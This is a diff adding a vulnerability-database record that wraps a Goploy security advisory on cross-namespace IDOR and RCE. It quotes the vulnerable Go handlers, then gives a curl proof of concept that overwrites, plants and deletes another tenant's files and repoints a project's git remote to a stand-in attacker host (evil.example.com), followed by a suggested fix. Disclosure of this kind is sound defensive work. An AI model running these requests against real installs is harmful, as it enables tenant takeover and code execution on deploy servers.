@@ -1,0 +1,288 @@
+[id]
+ave_id = "AVE-2026-0412"
+aliases = ["CVE-2026-53552","GHSA-26rh-24rg-j3vv"]
+
+[basic]
+title = "Goploy: Cross-namespace IDOR and RCE via body-supplied row id in project and project_file handlers"
+description = "### Summary
+
+`Project.AddFile`, `Project.EditFile`, `Project.RemoveFile`, and `Project.Edit` in `cmd/server/api/project/handler.go` accept a project or project-file row id from the JSON body and act on it without checking that the project belongs to the caller's namespace. The corresponding `model.ProjectFile.GetData` and `model.Project.GetData` queries filter only by row id. A user holding the `manager` role (or any role that includes the `FileSync` / `EditProject` permission) in their own namespace can read, write, or delete files in any project across the install, and can rewrite any project's git remote URL by submitting the foreign id in the body. The git-URL primitive escalates to RCE on the next deploy because `Edit` runs `git remote set-url` on the project's working tree.
+
+### Affected
+
+`zhenorzz/goploy` `develop` HEAD as of 2026-05-27. Verified against the `zhenorzz/goploy:1.17.5` Docker image (`docker.io/zhenorzz/goploy@sha256:69d08e1d16d7a7167426c89456c4bcef8e077a16554a4067ff258fff26d5cd44`).
+
+The four handlers and the model lookups have been in this shape across the file API and project metadata API.
+
+### Vulnerable code
+
+`cmd/server/api/project/handler.go::AddFile` (creates file under any project's directory; body controls `projectId`):
+
+```go
+func (Project) AddFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ProjectID int64  `json:\"projectId\" validate:\"required,gt=0\"`
+        Content   string `json:\"content\" validate:\"required\"`
+        Filename  string `json:\"filename\" validate:\"required\"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&reqData); err != nil { ... }
+
+    filePath := path.Join(config.GetProjectFilePath(reqData.ProjectID), reqData.Filename)
+    // ... os.Create(filePath); file.WriteString(reqData.Content)
+    id, err := model.ProjectFile{ProjectID: reqData.ProjectID, Filename: reqData.Filename}.AddRow()
+}
+```
+
+`cmd/server/api/project/handler.go::EditFile` (overwrites file content; body controls file id, server derives project from the file row):
+
+```go
+func (Project) EditFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ID      int64  `json:\"id\" validate:\"required,gt=0\"`
+        Content string `json:\"content\" validate:\"required\"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&reqData); err != nil { ... }
+
+    projectFileData, err := model.ProjectFile{ID: reqData.ID}.GetData()
+    // ... os.Create(path.Join(config.GetProjectFilePath(projectFileData.ProjectID), projectFileData.Filename))
+    file.WriteString(reqData.Content)
+}
+```
+
+`cmd/server/api/project/handler.go::RemoveFile` (deletes file row + on-disk file by body id):
+
+```go
+func (Project) RemoveFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ProjectFileID int64 `json:\"projectFileId\" validate:\"required,gt=0\"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&reqData); err != nil { ... }
+    projectFileData, err := model.ProjectFile{ID: reqData.ProjectFileID}.GetData()
+    if err := os.Remove(path.Join(config.GetProjectFilePath(projectFileData.ProjectID), projectFileData.Filename)); err != nil { ... }
+}
+```
+
+`cmd/server/api/project/handler.go::Edit` (updates any project's metadata; on URL change runs `git remote set-url` in the project working tree):
+
+```go
+func (Project) Edit(gp *server.Goploy) server.Response {
+    // ... ReqData has ID, Name, URL, Branch, Script, etc.
+    projectData, err := model.Project{ID: reqData.ID}.GetData()
+    model.Project{ID: reqData.ID, Name: reqData.Name, URL: reqData.URL, ...}.EditRow()
+    if reqData.URL != projectData.URL {
+        srcPath := config.GetProjectPath(projectData.ID)
+        cmd := exec.Command(\"git\", \"remote\", \"set-url\", \"origin\", reqData.URL)
+        cmd.Dir = srcPath
+    }
+}
+```
+
+`internal/model/project_file.go::ProjectFile.GetData` filters only by row id, no namespace join:
+
+```go
+func (pf ProjectFile) GetData() (ProjectFile, error) {
+    err := sq.
+        Select(\"id, project_id, filename, insert_time, update_time\").
+        From(projectFileTable).
+        Where(sq.Eq{\"id\": pf.ID}).
+        ...
+}
+```
+
+`internal/server/route.go::Route.hasPermission` checks only namespace-level permission ids; nothing in the request flow verifies that the body-supplied project id belongs to `gp.Namespace.ID`:
+
+```go
+func (r Route) hasPermission(permissionIDs map[int64]struct{}) error {
+    if len(r.permissionIDs) == 0 { return nil }
+    for _, permissionID := range r.permissionIDs {
+        if _, ok := permissionIDs[permissionID]; ok { return nil }
+    }
+    return errors.New(\"no permission\")
+}
+```
+
+### Reachable
+
+Any logged-in user assigned the `manager` role in their own namespace can call `/project/addFile`, `/project/editFile`, `/project/removeFile`, and `/project/edit`. The seeded `manager` role (`role.id = 1`) is granted both `FileSync` (`permission.id = 68`) and `EditProject` (`permission.id = 17`) by `database/goploy.sql`. Multi-tenant deployments typically assign `manager` to each tenant's project owner; once a tenant's manager holds these permissions in their own namespace, they hold them globally for these four endpoints.
+
+### Proof of concept
+
+Setup against the published Docker image:
+
+```bash
+docker network create goploy-net
+docker run -d --name goploy-mysql --network goploy-net \
+    -e MYSQL_ROOT_PASSWORD=goploy123 -e MYSQL_DATABASE=goploy \
+    mysql:8.0 --default-authentication-plugin=mysql_native_password
+
+# Wait for MySQL, then load schema
+docker cp database/goploy.sql goploy-mysql:/tmp/goploy.sql
+docker exec goploy-mysql sh -c 'mysql -uroot -pgoploy123 goploy < /tmp/goploy.sql'
+
+# Mount goploy.toml pointing DB at goploy-mysql:3306
+docker run -d --name goploy-app --network goploy-net -p 18080:80 \
+    -v $PWD/repo:/opt/goploy/repository \
+    zhenorzz/goploy:1.17.5
+```
+
+Set up two namespaces and two non-super-manager users, each assigned `manager` (role_id=1) only in their own namespace:
+
+```bash
+# Admin login (default account admin / admin!@# requires first-login change)
+curl -s -c /tmp/admin.jar -X POST http://localhost:18080/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{\"account\":\"admin\",\"password\":\"admin!@#\",\"newPassword\":\"Admin!@#2026\"}'
+
+ADMIN_HDR='-b /tmp/admin.jar -H G-N-ID:1 -H Content-Type:application/json'
+
+# Create NS_B
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/add -d '{\"name\":\"ns_b\"}'
+# → {\"data\":{\"id\":2}}
+
+# Create alice (id=2) and bob (id=3)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/user/add \
+    -d '{\"account\":\"alice\",\"password\":\"Alice!@#2026\",\"name\":\"Alice\",\"contact\":\"\",\"superManager\":0}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/user/add \
+    -d '{\"account\":\"bob\",\"password\":\"Bob!@#2026\",\"name\":\"Bob\",\"contact\":\"\",\"superManager\":0}'
+
+# Assign alice → NS_A (id=1), bob → NS_B (id=2), both as manager (role_id=1)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/addUser \
+    -d '{\"namespaceId\":1,\"userIds\":[2],\"roleId\":1}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/addUser \
+    -d '{\"namespaceId\":2,\"userIds\":[3],\"roleId\":1}'
+
+# As admin in NS_A, create project alice-prod (id=1) with file alice-secrets.yml (id=1)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/project/add \
+    -d '{\"name\":\"alice-prod\",\"repoType\":\"git\",\"url\":\"https://github.com/zhenorzz/goploy.git\",
+         \"path\":\"/tmp/deploy/alice\",\"environment\":1,\"branch\":\"master\",\"transferType\":\"rsync\",
+         \"transferOption\":\"-rtv\",\"deployServerMode\":\"serial\",
+         \"script\":{\"afterPull\":{\"mode\":\"\",\"content\":\"\"},\"afterDeploy\":{\"mode\":\"\",\"content\":\"\"},
+                   \"deployFinish\":{\"mode\":\"\",\"content\":\"\"}}}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/project/addFile \
+    -d '{\"projectId\":1,\"filename\":\"alice-secrets.yml\",\"content\":\"# Alice secret\napi_key: ALICE_API_KEY_2026\n\"}'
+
+# Bob logs in (first-login change)
+curl -s -c /tmp/bob.jar -X POST http://localhost:18080/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{\"account\":\"bob\",\"password\":\"Bob!@#2026\",\"newPassword\":\"BobBob!@#2026\"}'
+
+BOB_HDR='-b /tmp/bob.jar -H G-N-ID:2 -H Content-Type:application/json'
+```
+
+Negative control: Bob's own namespace has no projects.
+
+```bash
+curl -s $BOB_HDR \"http://localhost:18080/project/getList?page=1&rows=100\"
+# → {\"code\":0,\"data\":{\"list\":[]}}
+```
+
+Exploit 1 — Bob overwrites Alice's file content:
+
+```bash
+curl -s $BOB_HDR -X PUT http://localhost:18080/project/editFile \
+    -d '{\"id\":1,\"content\":\"OWNED BY BOB\nattacker_namespace: ns_b\n\"}'
+# → {\"code\":0,\"message\":\"\",\"data\":null}
+
+docker exec goploy-app cat /opt/goploy/repository/repository/project-file/project_1/alice-secrets.yml
+# OWNED BY BOB
+# attacker_namespace: ns_b
+```
+
+Exploit 2 — Bob plants a new file in Alice's project directory:
+
+```bash
+curl -s $BOB_HDR -X POST http://localhost:18080/project/addFile \
+    -d '{\"projectId\":1,\"filename\":\".env.attacker\",\"content\":\"PWN=bob_from_ns_b\"}'
+# → {\"code\":0,\"message\":\"\",\"data\":{\"id\":2}}
+
+docker exec goploy-app ls /opt/goploy/repository/repository/project-file/project_1/
+# .env.attacker   alice-secrets.yml
+```
+
+Exploit 3 — Bob deletes Alice's file:
+
+```bash
+curl -s $BOB_HDR -X DELETE http://localhost:18080/project/removeFile \
+    -d '{\"projectFileId\":1}'
+# → {\"code\":0,\"message\":\"\",\"data\":null}
+# alice-secrets.yml is gone from project_1/.
+```
+
+Exploit 4 — Bob rewrites Alice's project git remote URL. On the next deploy, goploy runs `git -C <alice-prod-tree> remote set-url origin <attacker-url>` and clones / pulls attacker code, leading to RCE under goploy's user:
+
+```bash
+curl -s $BOB_HDR -X PUT http://localhost:18080/project/edit \
+    -d '{\"id\":1,\"name\":\"alice-prod\",\"repoType\":\"git\",
+         \"url\":\"git@evil.example.com:attacker/payload.git\",
+         \"path\":\"/tmp/deploy/alice\",\"environment\":1,\"branch\":\"master\",
+         \"transferType\":\"rsync\",\"transferOption\":\"-rtv\",\"deployServerMode\":\"serial\",
+         \"script\":{\"afterPull\":{\"mode\":\"\",\"content\":\"\"},\"afterDeploy\":{\"mode\":\"\",\"content\":\"\"},
+                   \"deployFinish\":{\"mode\":\"\",\"content\":\"\"}}}'
+# → {\"code\":0,\"message\":\"\",\"data\":null}
+
+docker exec goploy-mysql mysql -uroot -pgoploy123 goploy \
+    -e \"SELECT name,url FROM project WHERE id=1;\"
+# alice-prod | git@evil.example.com:attacker/payload.git
+```
+
+Positive control: Bob editing a file in his own namespace (after creating one) goes through the same code path and succeeds normally — the patch must keep that working.
+
+### Suggested fix
+
+Add a namespace-scoped variant of `GetData` so the model layer requires `(id, namespace_id)` and switch the four handlers over.
+
+`internal/model/project_file.go`:
+
+```go
+func (pf ProjectFile) GetDataInNamespace(namespaceID int64) (ProjectFile, error) {
+    var projectFile ProjectFile
+    err := sq.
+        Select(\"pf.id, pf.project_id, pf.filename, pf.insert_time, pf.update_time\").
+        From(projectFileTable + \" pf\").
+        Join(\"project p ON p.id = pf.project_id\").
+        Where(sq.Eq{\"pf.id\": pf.ID, \"p.namespace_id\": namespaceID}).
+        RunWith(DB).
+        QueryRow().
+        Scan(&projectFile.ID, &projectFile.ProjectID, &projectFile.Filename,
+             &projectFile.InsertTime, &projectFile.UpdateTime)
+    return projectFile, err
+}
+```
+
+`internal/model/project.go`: add a parallel `Project.GetDataInNamespace` that joins on `namespace_id`.
+
+`cmd/server/api/project/handler.go`:
+
+- `EditFile` and `RemoveFile` switch to `model.ProjectFile{ID: ...}.GetDataInNamespace(gp.Namespace.ID)`.
+- `AddFile` calls a new `model.Project{ID: reqData.ProjectID}.GetDataInNamespace(gp.Namespace.ID)` precheck before `os.Create` and `AddRow`.
+- `Edit` calls `model.Project{ID: reqData.ID}.GetDataInNamespace(gp.Namespace.ID)` before `EditRow`.
+
+`sql.ErrNoRows` from the namespace-scoped lookup becomes the correct denial for any cross-namespace id. The same pattern should be applied to other body-id consumers in this file (`Remove`, `SetAutoDeploy`, `UploadFile`, `AddTask`, `EditProcess`, etc.) but the four endpoints above are the immediately exploitable ones.
+
+### Patch
+
+Fix proposed in https://github.com/zhenorzz/goploy-ghsa-26rh-24rg-j3vv/pull/1. The PR diff adds the namespace-scoped model variants and switches the four exposed handlers to use them.
+
+### Credit
+
+Reported by tonghuaroot."
+severity = "CRITICAL"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-25T00:51:23.015566081+00:00"
